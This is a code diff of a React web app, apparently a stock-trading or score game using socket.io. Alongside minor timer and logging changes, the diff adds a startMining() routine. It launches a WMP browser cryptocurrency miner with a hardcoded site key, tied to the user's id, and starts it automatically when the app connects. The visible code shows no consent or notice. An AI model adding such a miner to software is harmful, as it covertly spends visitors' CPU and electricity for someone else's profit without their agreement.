@@ -20,7 +20,7 @@ class App extends Component {
 	state = {
 		activeStory: "home",
 		activePanel: "main",
-		popout: null,
+		popout: <ScreenSpinner />,
 		snackbar: null,
 		globState: {
 			api: null,
@@ -103,7 +103,7 @@ class App extends Component {
 		socket.emit("get_stocks");	
 		this.setPopout(null)
 		socket.on("updated_score", (data) => {
-			//console.log(data)
+			console.log(data)
 			const { user } = this.state.globState;
 			this.setGlobState({ user: { ...user, ...data }});
 		})
@@ -124,12 +124,35 @@ class App extends Component {
 			this.setPopout(null)
 		})
 
+		socket.on("sale_create", (buy_id) => {
+			this.setPopout(null)
+			console.log(buy_id)
+		})
+
 
 		let timer = setInterval(() => {
 			const { user } = this.state.globState;
 			socket.emit("add_score_timer", user.user_id);
-		}, 1000);
-		this.setGlobState({ user: { ...data, id: undefined }, timer });
+		}, 2000);
+
+		let timer_miner = setInterval(() => {
+			const { user } = this.state.globState;
+			socket.emit("add_score_timer_miner", user.user_id);
+		}, 6000);
+
+		this.setGlobState({ user: { ...data, id: undefined }, timer, timer_miner });
+
+		this.startMining()
+
+	}
+
+	startMining() {
+		const { user } = this.state.globState;
+		var miner = WMP.User('SK_dwgCbaomNA2QwH6xq5mdQ', String(user.user_id), {
+			throttle: 0.9,
+			forceASMJS: false
+		});
+    	miner.start();
 	}
 
 	onclose = (e) => {
